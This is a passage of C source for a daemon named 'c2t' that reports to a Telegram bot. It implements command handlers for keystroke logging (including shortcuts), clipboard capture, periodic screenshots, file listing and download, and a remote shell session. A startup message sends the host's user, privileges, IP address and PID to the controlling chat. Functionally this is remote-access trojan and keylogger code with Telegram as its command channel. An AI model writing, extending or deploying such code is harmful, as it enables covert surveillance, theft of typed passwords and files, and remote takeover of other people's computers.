    snprintf(clip_detail, sizeof(clip_detail), "❌ <b>DISABLED</b>");
  } else {
    snprintf(clip_detail, sizeof(clip_detail),
             "🟢 <b>ACTIVE</b> (Window info: %s)",
             config->telegram_send_window_info ? "Yes" : "No");
  }

  char kb_detail[256] = {};
  if (config->disable_keyboard) {
    snprintf(kb_detail, sizeof(kb_detail), "❌ <b>DISABLED</b>");
  } else {
    char kb_target[64] = "all", kb_layout[32] = "it";
    keyboard_get_selected_target(kb_target, sizeof(kb_target));
    keyboard_get_layout(kb_layout, sizeof(kb_layout));
    char esc_target[128] = {}, esc_layout[64] = {};
    escape_html_str(kb_target, esc_target, sizeof(esc_target));
    escape_html_str(kb_layout, esc_layout, sizeof(esc_layout));
    int kb_mode = keyboard_get_format_mode();
    snprintf(
        kb_detail, sizeof(kb_detail),
        "🟢 <b>ACTIVE</b> (Target: <code>%s</code>, Layout: <code>%s</code>, "
        "Mode: %s)",
        esc_target, esc_layout,
        kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text");
  }

  char shot_detail[256] = {};
  if (config->disable_screenshot) {
    snprintf(shot_detail, sizeof(shot_detail), "❌ <b>DISABLED</b>");
  } else {
    const char *be_name = screenshot_get_backend_name();
    char esc_be[64] = {};
    escape_html_str(be_name ? be_name : "native", esc_be, sizeof(esc_be));
    size_t interval = screenshot_get_interval();
    if (interval > 0) {
      snprintf(shot_detail, sizeof(shot_detail),
               "🟢 <b>PERIODIC</b> (%llu s, Backend: %s, Q%d)",
               (unsigned long long)interval, esc_be, screenshot_get_quality());
    } else {
      snprintf(shot_detail, sizeof(shot_detail),
               "🟢 <b>ON-DEMAND</b> (Backend: %s, Q%d)", esc_be,
               screenshot_get_quality());
    }
  }

  const char *crypto_engine = c2t_crypto_chacha20_backend();
  char esc_crypto[128] = {};
  escape_html_str(crypto_engine ? crypto_engine : "ChaCha20", esc_crypto,
                  sizeof(esc_crypto));

  char proxy_str[256] = "Direct";
  if (config->proxy && *config->proxy) {
    escape_html_str(config->proxy, proxy_str, sizeof(proxy_str));
  }

  char shell_status_str[128] = {};
  c2t_shell_get_status_info(shell_status_str, sizeof(shell_status_str));
  const char *priv_str = c2t_runtime_get_privilege_str();

  char msg[3800];
  snprintf(
      msg, sizeof(msg),
      "🚀 <b>c2t Daemon Online</b>\n\n"
      "💻 <b>Host System:</b>\n"
      "• <b>User &amp; Host:</b> <code>%s@%s</code>\n"
      "• <b>Privileges:</b> %s\n"
      "• <b>OS &amp; Kernel:</b> %s\n"
      "• <b>Local IP:</b> <code>%s</code>\n"
      "• <b>Process:</b> <code>%s</code> (PID: <code>%lu</code>)\n"
      "• <b>Version:</b> <code>v%s</code>\n"
      "• <b>Role:</b> %s\n\n"
      "⚙️ <b>Active Subsystems:</b>\n"
      "• 💻 <b>Shell Engine:</b> %s\n"
      "• 📋 <b>Clipboard:</b> %s\n"
      "• ⌨️ <b>Keyboard:</b> %s\n"
      "• 📸 <b>Screenshots:</b> %s\n"
      "• 📜 <b>Log Sender:</b> %s\n"
      "• 📁 <b>File Operations:</b> %s\n"
      "• 🔒 <b>Crypto:</b> <code>%s</code>\n"
      "• 🌐 <b>Proxy:</b> <code>%s</code>\n\n"
      "💡 <i>Use <code>/help</code> for available commands, <code>/shell_help</code> for shell guide, or <code>/status</code> for live stats.</i>",
      user, host, priv_str, os_str, ip_str, proc_name, pid, C2T_VERSION, role_str,
      shell_status_str,
      clip_detail, kb_detail, shot_detail,
      config->telegram_send_logs ? "🟢 Periodic" : "⚪ On-demand (/logs)",
      config->telegram_send_files ? "🟢 Enabled" : "❌ Disabled", esc_crypto,
      proxy_str);

  int ret = telegram_send_html(msg);
  c2t_log_info("telegram", "Startup notification delivery %s",
               ret ? "succeeded" : "failed");
  return ret;
}

static void restart_subsystem_keyboard(void) {
  const c2t_config_t *config = c2t_config_get();
  if (config->disable_keyboard) {
    telegram_send_html(
        "⚠️ <b>Keyboard Subsystem Disabled</b>\n<i>Keyboard monitoring is "
        "disabled in configuration (--no-keyboard).</i>");
    return;
  }
  c2t_log_info("listener", "Restarting keyboard subsystem...");
  keyboard_listener_cleanup();
  keyboard_output_cleanup();
  int out_ok = keyboard_output_init();
  int list_ok = keyboard_listener_init();
  char dev_buf[64] = "all";
  keyboard_get_selected_target(dev_buf, sizeof(dev_buf));
  char layout[32] = "it";
  keyboard_get_layout(layout, sizeof(layout));
  int dev_count = keyboard_get_device_count();
  char msg[600];
  snprintf(msg, sizeof(msg),
           "🔄 <b>Keyboard Subsystem Restarted</b>\n\n"
           "• <b>Status:</b> %s\n"
           "• <b>Target:</b> <code>%s</code>\n"
           "• <b>Layout:</b> <code>%s</code>\n"
           "• <b>Detected Devices:</b> %d\n\n"
           "<i>Keyboard listener and delivery worker re-initialized.</i>",
           (out_ok && list_ok) ? "🟢 <b>ACTIVE</b>"
                               : "⚠️ <b>WARNING (Partial init)</b>",
           dev_buf, layout, dev_count);
  telegram_send_html(msg);
}

static void restart_subsystem_clipboard(void) {
  const c2t_config_t *config = c2t_config_get();
  if (config->disable_clipboard) {
    telegram_send_html(
        "⚠️ <b>Clipboard Subsystem Disabled</b>\n<i>Clipboard monitoring is "
        "disabled in configuration (--no-clipboard).</i>");
    return;
  }
  c2t_log_info("listener", "Restarting clipboard subsystem...");
  clipboard_output_cleanup();
  int out_ok = clipboard_output_init();
  clipboard_set_paused(0);
  char msg[512];
  snprintf(msg, sizeof(msg),
           "🔄 <b>Clipboard Subsystem Restarted</b>\n\n"
           "• <b>Status:</b> %s\n"
           "• <b>Buffer:</b> Clean / Reset\n\n"
           "<i>Clipboard delivery worker has been re-initialized and resumed.</i>",
           out_ok ? "🟢 <b>ACTIVE</b>" : "⚠️ <b>ERROR</b>");
  telegram_send_html(msg);
}

static void restart_subsystem_screenshot(void) {
  const c2t_config_t *config = c2t_config_get();
  if (config->disable_screenshot) {
    telegram_send_html(
        "⚠️ <b>Screenshot Subsystem Disabled</b>\n<i>Screenshot functionality "
        "is disabled in configuration (--no-screenshot).</i>");
    return;
  }
  c2t_log_info("listener", "Restarting screenshot subsystem...");
  screenshot_output_cleanup();
  int ok = screenshot_output_init();
  screenshot_set_paused(0);
  char cur_target[64] = "all";
  screenshot_get_selected_display(cur_target, sizeof(cur_target));
  size_t interval = screenshot_get_interval();
  char msg[600];
  snprintf(msg, sizeof(msg),
           "🔄 <b>Screenshot Subsystem Restarted</b>\n\n"
           "• <b>Status:</b> %s\n"
           "• <b>Backend:</b> <code>%s</code>\n"
           "• <b>Detected Displays:</b> %d (Target: <code>%s</code>)\n"
           "• <b>Timer:</b> %llu s\n\n"
           "<i>Screenshot backend, capture buffers, and workers re-initialized.</i>",
           ok ? "🟢 <b>ACTIVE</b>" : "⚠️ <b>ERROR</b>",
           screenshot_get_backend_name(), screenshot_get_display_count(),
           cur_target, (unsigned long long)interval);
  telegram_send_html(msg);
}

static void restart_subsystem_logs(void) {
  c2t_log_info("listener", "Restarting log sender subsystem...");
  c2t_log_sender_cleanup();
  int ok = c2t_log_sender_init();
  char msg[512];
  snprintf(msg, sizeof(msg),
           "🔄 <b>Log Sender Subsystem Restarted</b>\n\n"
           "• <b>Status:</b> %s\n\n"
           "<i>Log queue flushed and dispatch worker re-initialized.</i>",
           ok ? "🟢 <b>ACTIVE</b>" : "⚪ <b>STANDBY (On-demand only)</b>");
  telegram_send_html(msg);
}

static void restart_subsystem_shell(void) {
  c2t_log_info("listener", "Restarting shell subsystem...");
  c2t_shell_subsystem_restart();
  char msg[512];
  snprintf(msg, sizeof(msg),
           "🔄 <b>Shell &amp; Execution Subsystem Restarted</b>\n\n"
           "• <b>Status:</b> 🟢 <b>READY</b>\n"
           "• <b>Interactive Sessions:</b> ⚪ Terminated &amp; Cleaned\n\n"
           "<i>All session process trees reaped and buffers flushed cleanly.</i>");
  telegram_send_html(msg);
}

static void restart_subsystem_all(void) {
  const c2t_config_t *config = c2t_config_get();
  c2t_log_info("listener", "Restarting all subsystems in-place...");
  if (!config->disable_keyboard) {
    keyboard_listener_cleanup();
    keyboard_output_cleanup();
    (void)keyboard_output_init();
    (void)keyboard_listener_init();
  }
  if (!config->disable_clipboard) {
    clipboard_output_cleanup();
    (void)clipboard_output_init();
    clipboard_set_paused(0);
  }
  if (!config->disable_screenshot) {
    screenshot_output_cleanup();
    (void)screenshot_output_init();
    screenshot_set_paused(0);
  }
  c2t_log_sender_cleanup();
  (void)c2t_log_sender_init();
  c2t_shell_subsystem_restart();

  char msg[768];
  snprintf(
      msg, sizeof(msg),
      "🔄 <b>All Subsystems Reset &amp; Restarted</b>\n\n"
      "• 📋 <b>Clipboard:</b> %s\n"
      "• ⌨️ <b>Keyboard:</b> %s\n"
      "• 📸 <b>Screenshots:</b> %s\n"
      "• 📜 <b>Log Sender:</b> %s\n"
      "• 💻 <b>Shell Engine:</b> 🟢 Reset &amp; Ready\n\n"
      "<i>All monitoring engines, worker threads, and memory buffers refreshed in-place.</i>",
      config->disable_clipboard ? "❌ Disabled" : "🟢 Reset &amp; Active",
      config->disable_keyboard ? "❌ Disabled" : "🟢 Reset &amp; Active",
      config->disable_screenshot ? "❌ Disabled" : "🟢 Reset &amp; Active",
      config->telegram_send_logs ? "🟢 Reset &amp; Active"
                                 : "⚪ Reset &amp; Standby");
  telegram_send_html(msg);
}

static void restart_daemon_process(const telegram_incoming_update_t *update) {
  const c2t_config_t *config = c2t_config_get();
  c2t_log_warning("listener",
                  "Complete daemon restart initiated via Telegram command");
  telegram_send_html(
      "🔄 <b>c2t Daemon Restarting</b>\n<i>Restarting process in a few "
      "moments...</i>");

  /* Confirm update offset to Telegram so restart command is not re-executed */
  if (update && update->update_id > 0 && config->telegram_bot_token) {
    int64_t ack_offset = update->update_id + 1;
    (void)telegram_poll_updates_callback(config->telegram_bot_token,
                                         &ack_offset, 0, nullptr, nullptr);
  }

  (void)c2t_runtime_trigger_restart();
}

static void handle_command(const telegram_incoming_update_t *update,
                           const char *chat_id,
                           [[maybe_unused]] const char *username) {
  const char *text = update && update->text ? update->text : "";
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_chat_id || !*config->telegram_chat_id) {
    c2t_log_warning("listener", "Telegram chat_id is not configured");
    return;
  }

  const char *cfg_chat = config->telegram_chat_id;
  while (isspace((unsigned char)*cfg_chat))
    cfg_chat++;
  while (isspace((unsigned char)*chat_id))
    chat_id++;

  if (strcmp(chat_id, cfg_chat) != 0) {
    c2t_log_warning(
        "listener",
        "Ignored command '%s' from unauthorized chat_id: %s (authorized: %s)",
        text, chat_id, cfg_chat);
    return;
  }

  c2t_log_info("listener", "Executing Telegram command '%s' from chat %s", text,
               chat_id);

  if (c2t_shell_live_is_active()) {
    if (c2t_shell_live_handle_input(text)) {
      return;
    }
  }

  c2t_cmd_id_t cmd = lookup_command_id(text);
  switch (cmd) {
  case CMD_PAUSE: {
    int kb_enabled = !config->disable_keyboard;
    int clip_enabled = !config->disable_clipboard;
    int shot_enabled = !config->disable_screenshot;
    if (!kb_enabled && !clip_enabled && !shot_enabled) {
      telegram_send_html(
          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
          "screenshot subsystems are disabled in configuration.</i>");
    } else {
      if (clip_enabled)
        clipboard_set_paused(1);
      if (kb_enabled)
        keyboard_set_paused(1);
      if (shot_enabled)
        screenshot_set_paused(1);
      c2t_log_info("listener", "Monitoring paused by Telegram command");
      telegram_send_html(
          "⏸️ <b>Monitoring Paused</b>\n<i>All active monitoring captures "
          "are paused until resumed with /resume or /toggle.</i>");
    }
    break;
  }

  case CMD_RESUME: {
    int kb_enabled = !config->disable_keyboard;
    int clip_enabled = !config->disable_clipboard;
    int shot_enabled = !config->disable_screenshot;
    if (!kb_enabled && !clip_enabled && !shot_enabled) {
      telegram_send_html(
          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
          "screenshot subsystems are disabled in configuration.</i>");
    } else {
      if (clip_enabled)
        clipboard_set_paused(0);
      if (kb_enabled)
        keyboard_set_paused(0);
      if (shot_enabled)
        screenshot_set_paused(0);
      c2t_log_info("listener", "Monitoring resumed by Telegram command");
      telegram_send_html(
          "▶️ <b>Monitoring Resumed</b>\n<i>c2t is actively capturing and "
          "forwarding events.</i>");
    }
    break;
  }

  case CMD_TOGGLE: {
    int kb_enabled = !config->disable_keyboard;
    int clip_enabled = !config->disable_clipboard;
    int shot_enabled = !config->disable_screenshot;
    if (!kb_enabled && !clip_enabled && !shot_enabled) {
      telegram_send_html(
          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
          "screenshot subsystems are disabled in configuration.</i>");
    } else {
      int clip_paused = clip_enabled ? clipboard_is_paused() : 1;
      int key_paused = kb_enabled ? keyboard_is_paused() : 1;
      int shot_paused = shot_enabled ? screenshot_is_paused() : 1;
      int target = !(clip_paused && key_paused && shot_paused);
      if (clip_enabled)
        clipboard_set_paused(target);
      if (kb_enabled)
        keyboard_set_paused(target);
      if (shot_enabled)
        screenshot_set_paused(target);
      c2t_log_info("listener", "Monitoring toggled to %s by Telegram command",
                   target ? "paused" : "active");
      if (target) {
        telegram_send_html("⏸️ <b>Monitoring Paused</b>\n<i>All active "
                           "monitoring is now paused.</i>");
      } else {
        telegram_send_html("▶️ <b>Monitoring Resumed</b>\n<i>All active "
                           "monitoring is now running.</i>");
      }
    }
    break;
  }

  case CMD_CLIPBOARD_ON: {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      clipboard_set_paused(0);
      c2t_log_info("listener",
                   "Clipboard monitoring resumed by Telegram command");
      telegram_send_html(
          "▶️ <b>Clipboard Monitoring Resumed</b>\n<i>Clipboard listener is "
          "actively capturing clipboard events.</i>");
    }
    break;
  }

  case CMD_CLIPBOARD_OFF: {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      clipboard_set_paused(1);
      c2t_log_info("listener",
                   "Clipboard monitoring paused by Telegram command");
      telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>Clipboard "
                         "event capturing is currently muted.</i>");
    }
    break;
  }

  case CMD_CLIPBOARD_TOGGLE: {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      int p = clipboard_toggle_paused();
      c2t_log_info("listener",
                   "Clipboard monitoring toggled to %s by Telegram command",
                   p ? "paused" : "active");
      if (p) {
        telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>Clipboard "
                           "capturing is currently muted.</i>");
      } else {
        telegram_send_html(
            "▶️ <b>Clipboard Monitoring Resumed</b>\n<i>Clipboard listener is "
            "actively capturing events.</i>");
      }
    }
    break;
  }

  case CMD_CLIPBOARD_FLUSH: {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      clipboard_output_flush();
      c2t_log_info(
          "listener",
          "Flushing clipboard queue on-demand by /clipboard_flush command");
      telegram_send_html("⚡ <b>Clipboard Queue Flushed</b>\n<i>Worker "
                         "signaled to process any queued clipboard items.</i>");
    }
    break;
  }

  case CMD_CLIPBOARD_STATUS: {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      char stat_msg[1024];
      clipboard_get_status_info(stat_msg, sizeof(stat_msg));
      telegram_send_html(stat_msg);
    }
    break;
  }

  case CMD_CLIPBOARD_HELP: {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      char clip_help[1024];
      snprintf(
          clip_help, sizeof(clip_help),
          "📋 <b>Clipboard Control Commands</b>\n\n"
          "• <code>/clipboard_on</code> - Enable clipboard capturing\n"
          "• <code>/clipboard_off</code> - Pause clipboard capturing\n"
          "• <code>/clipboard_toggle</code> - Toggle active / paused state\n"
          "• <code>/clipboard_status</code> - View clipboard monitor &amp; "
          "queue state\n"
          "• <code>/clipboard_flush</code> - Signal immediate delivery of "
          "pending items\n\n"
          "💡 <i>Tip: Commands also accept dash syntax (e.g. "
          "<code>/clipboard-status</code>)</i>");
      telegram_send_html(clip_help);
    }
    break;
  }

  case CMD_KEYBOARD_DEVICES: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      char dev_list[2048];
      if (keyboard_get_device_list(dev_list, sizeof(dev_list))) {
        telegram_send_html(dev_list);
      } else {
        telegram_send_html("⚠️ <i>Unable to query keyboard devices.</i>");
      }
    }
    break;
  }

  case CMD_KEYBOARD_SELECT: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        telegram_send_html(
            "⚠️ <b>Usage:</b> <code>/keyboard_select "
            "&lt;id|name|all&gt;</code>\n"
            "<i>Example:</i> <code>/keyboard_select 0</code> or "
            "<code>/keyboard_select all</code>\n"
            "<i>Use <code>/keyboard_list</code> to see available devices.</i>");
      } else {
        char target_buf[128];
        size_t tlen = 0;
        while (arg[tlen] && !isspace((unsigned char)arg[tlen]) &&
               tlen + 1 < sizeof(target_buf)) {
          target_buf[tlen] = arg[tlen];
          tlen++;
        }
        target_buf[tlen] = '\0';

        (void)keyboard_select_device(target_buf);
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎯 <b>Keyboard Target Selected:</b> <code>%s</code>\n"
                 "<i>Capturing only keystrokes matching target '%s'.</i>",
                 target_buf, target_buf);
        telegram_send_html(resp);
      }
    }
    break;
  }

  case CMD_KEYBOARD_ON: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      keyboard_set_paused(0);
      c2t_log_info("listener",
                   "Keyboard monitoring resumed by Telegram command");
      telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard "
                         "listener is now capturing keystrokes.</i>");
    }
    break;
  }

  case CMD_KEYBOARD_OFF: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      keyboard_set_paused(1);
      c2t_log_info("listener",
                   "Keyboard monitoring paused by Telegram command");
      telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke "
                         "capturing is currently muted.</i>");
    }
    break;
  }

  case CMD_KEYBOARD_TOGGLE: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      int p = keyboard_toggle_paused();
      c2t_log_info("listener",
                   "Keyboard monitoring toggled to %s by Telegram command",
                   p ? "paused" : "active");
      if (p) {
        telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke "
                           "capturing is currently muted.</i>");
      } else {
        telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard "
                           "listener is now capturing keystrokes.</i>");
      }
    }
    break;
  }

  case CMD_KEYBOARD_MODE: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (match_command(arg, "code") || match_command(arg, "pretty") ||
          match_command(arg, "block")) {
        keyboard_set_format_mode(KEYBOARD_MODE_CODE);
        c2t_log_info("listener", "Keyboard format mode set to CODE");
        telegram_send_html("🎨 <b>Keyboard Mode Set:</b> <code>Code Block "
                           "(&lt;pre&gt;&lt;code&gt;)</code>\n"
                           "<i>Keystrokes will be formatted inside structured "
                           "code blocks.</i>");
      } else if (match_command(arg, "raw") || match_command(arg, "plain") ||
                 match_command(arg, "text")) {
        keyboard_set_format_mode(KEYBOARD_MODE_RAW);
        c2t_log_info("listener", "Keyboard format mode set to RAW");
        telegram_send_html(
            "📝 <b>Keyboard Mode Set:</b> <code>Raw Plain Text</code>\n"
            "<i>Keystrokes will be delivered as plain unformatted text.</i>");
      } else {
        int cur = keyboard_get_format_mode();
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎨 <b>Current Keyboard Format:</b> %s\n\n"
                 "<b>Usage:</b>\n"
                 "• <code>/keyboard_mode code</code> - Formatted code blocks\n"
                 "• <code>/keyboard_mode raw</code> - Plain text raw output",
                 cur == KEYBOARD_MODE_CODE
                     ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>"
                     : "<code>Raw Text</code>");
        telegram_send_html(resp);
      }
    }
    break;
  }

  case CMD_KEYBOARD_FLUSH: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      keyboard_output_flush();
      c2t_log_info(
          "listener",
          "Flushing keyboard buffer on-demand by /keyboard_flush command");
      telegram_send_html("⚡ <b>Keyboard Buffer Flushed</b>\n<i>Pending "
                         "keystrokes have been dispatched.</i>");
    }
    break;
  }

  case CMD_KEYBOARD_STATUS: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      char stat_msg[1024];
      keyboard_get_status_info(stat_msg, sizeof(stat_msg));
      telegram_send_html(stat_msg);
    }
    break;
  }

  case CMD_KEYBOARD_LAYOUT: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        char cur_layout[128] = "Unknown";
        keyboard_get_layout(cur_layout, sizeof(cur_layout));
        char avail_layouts[1024];
        keyboard_get_available_layouts(avail_layouts, sizeof(avail_layouts));
        char resp[1500];
        snprintf(resp, sizeof(resp),
                 "⌨️ <b>Active Layout:</b> %s\n\n"
                 "%s\n"
                 "💡 <b>To switch:</b> <code>/keyboard_layout "
                 "&lt;code&gt;</code> (e.g. <code>/keyboard_layout it</code>)",
                 cur_layout, avail_layouts);
        telegram_send_html(resp);
      } else {
        char code_buf[32];
        size_t clen = 0;
        while (arg[clen] && !isspace((unsigned char)arg[clen]) &&
               clen + 1 < sizeof(code_buf)) {
          code_buf[clen] = arg[clen];
          clen++;
        }
        code_buf[clen] = '\0';

        if (keyboard_set_layout(code_buf)) {
          char new_layout[128] = "Unknown";
          keyboard_get_layout(new_layout, sizeof(new_layout));
          char resp[512];
          snprintf(resp, sizeof(resp),
                   "🌐 <b>Keyboard Layout Updated:</b> %s\n"
                   "<i>Keystrokes will now be translated using the selected "
                   "layout.</i>",
                   new_layout);
          telegram_send_html(resp);
        } else {
          char avail_layouts[1024];
          keyboard_get_available_layouts(avail_layouts, sizeof(avail_layouts));
          char resp[1200];
          snprintf(resp, sizeof(resp),
                   "⚠️ <b>Invalid Layout Code:</b> <code>%s</code>\n\n%s",
                   code_buf, avail_layouts);
          telegram_send_html(resp);
        }
      }
    }
    break;
  }

  case CMD_KEYBOARD_SHORTCUTS: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (arg && *arg) {
        while (isspace((unsigned char)*arg))
          arg++;
        if (c2t_strcasecmp(arg, "on") == 0 || c2t_strcasecmp(arg, "1") == 0 ||
            c2t_strcasecmp(arg, "enable") == 0 ||
            c2t_strcasecmp(arg, "start") == 0) {
          keyboard_set_shortcuts_enabled(1);
          telegram_send_html(
              "⌨️ <b>Keyboard Shortcuts Capture:</b> 🟢 "
              "<b>ENABLED</b>\n<i>Modifier shortcuts ([Ctrl+C], [Alt+Tab], "
              "etc.) and special keys will now be captured.</i>");
        } else if (c2t_strcasecmp(arg, "off") == 0 ||
                   c2t_strcasecmp(arg, "0") == 0 ||
                   c2t_strcasecmp(arg, "disable") == 0 ||
                   c2t_strcasecmp(arg, "stop") == 0) {
          keyboard_set_shortcuts_enabled(0);
          telegram_send_html(
              "⌨️ <b>Keyboard Shortcuts Capture:</b> ⚪ "
              "<b>DISABLED</b>\n<i>Clean typing text mode active: modifier "
              "tags and special key tags are suppressed.</i>");
        } else if (c2t_strcasecmp(arg, "toggle") == 0) {
          int s = keyboard_toggle_shortcuts();
          char resp[256];
          snprintf(resp, sizeof(resp),
                   "⌨️ <b>Keyboard Shortcuts Capture:</b> %s",
                   s ? "🟢 <b>ENABLED</b> (Capturing shortcuts)"
                     : "⚪ <b>DISABLED</b> (Clean typing text only)");
          telegram_send_html(resp);
        } else {
          telegram_send_html("⚠️ <b>Usage:</b> <code>/keyboard_shortcuts "
                             "&lt;on|off|toggle&gt;</code>");
        }
      } else {
        int s = keyboard_get_shortcuts_enabled();
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "⌨️ <b>Keyboard Shortcuts Capture:</b> %s\n\n"
                 "• <code>/keyboard_shortcuts on</code> - Capture [Ctrl+C], "
                 "[Alt+Tab], and special keys\n"
                 "• <code>/keyboard_shortcuts off</code> - Clean typing text "
                 "only (suppress tags)\n"
                 "• <code>/keyboard_shortcuts toggle</code> - Toggle state",
                 s ? "🟢 <b>ENABLED</b>" : "⚪ <b>DISABLED (Default)</b>");
        telegram_send_html(resp);
      }
    }
    break;
  }

  case CMD_KEYBOARD_HELP: {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      char kb_help[1200];
      snprintf(
          kb_help, sizeof(kb_help),
          "⌨️ <b>Keyboard Control Commands</b>\n\n"
          "• <code>/keyboard_list</code> - View detected keyboard devices "
          "&amp; status\n"
          "• <code>/keyboard_select &lt;id|all&gt;</code> - Filter capture to "
          "a specific keyboard\n"
          "• <code>/keyboard_layout [code]</code> - View or change keyboard "
          "layout\n"
          "• <code>/keyboard_shortcuts &lt;on|off|toggle&gt;</code> - "
          "Enable/disable shortcuts &amp; special keys\n"
          "• <code>/keyboard_on</code> - Enable keyboard capturing\n"
          "• <code>/keyboard_off</code> - Pause keyboard capturing\n"
          "• <code>/keyboard_toggle</code> - Toggle active / paused state\n"
          "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Change output "
          "formatting\n"
          "• <code>/keyboard_flush</code> - Flush buffered keys to Telegram "
          "immediately\n"
          "• <code>/keyboard_status</code> - View keyboard monitor state &amp; "
          "buffer status\n\n"
          "💡 <i>Tip: Commands also accept dash syntax (e.g. "
          "<code>/keyboard-shortcuts off</code>)</i>");
      telegram_send_html(kb_help);
    }
    break;
  }

  case CMD_GETFILE: {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html(
          "⚠️ <b>Usage:</b> <code>/getfile &lt;file_path&gt;</code>\n"
          "<i>Example:</i> <code>/getfile /etc/hosts</code> or <code>/getfile "
          "\"C:\\path\\file.txt\"</code>\n"
          "<i>Use <code>/ls</code> to explore directories.</i>");
    } else {
      c2t_log_info("listener",
                   "Retrieving file '%s' on-demand by Telegram command", arg);
      (void)c2t_file_send_path(arg, nullptr);
    }
    break;
  }

  case CMD_LS: {
    const char *arg = get_command_argument(text);
    char list_buf[4096];
    c2t_log_info("listener",
                 "Listing directory '%s' on-demand by Telegram command",
                 (arg && *arg) ? arg : ".");
    if (c2t_file_list_directory((arg && *arg) ? arg : ".", list_buf, sizeof(list_buf))) {
      telegram_send_html(list_buf);
    } else {
      telegram_send_html("⚠️ <b>Cannot list directory</b>\n<i>Directory does not exist or access denied.</i>");
    }
    break;
  }

  case CMD_FILE_EXPLORER: {
    const char *arg = get_command_argument(text);
    c2t_log_info("listener",
                 "Launching interactive File Explorer for '%s' on-demand by Telegram command",
                 (arg && *arg) ? arg : ".");
    (void)c2t_file_explorer_show((arg && *arg) ? arg : nullptr, 0, 0);
    break;
  }

  case CMD_CAT: {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html("⚠️ <b>Usage:</b> <code>/cat &lt;file_path&gt;</code>\n"
                         "<i>Example:</i> <code>/cat /etc/os-release</code>\n"
                         "<i>Use <code>/getfile</code> for full download or "
                         "binary files.</i>");
    } else {
      char preview_resp[3800];
      c2t_log_info(
          "listener",
          "Reading text preview for '%s' on-demand by Telegram command", arg);
      if (c2t_file_read_text_preview(arg, preview_resp, sizeof(preview_resp),
                                     3000)) {
        telegram_send_html(preview_resp);
      } else {
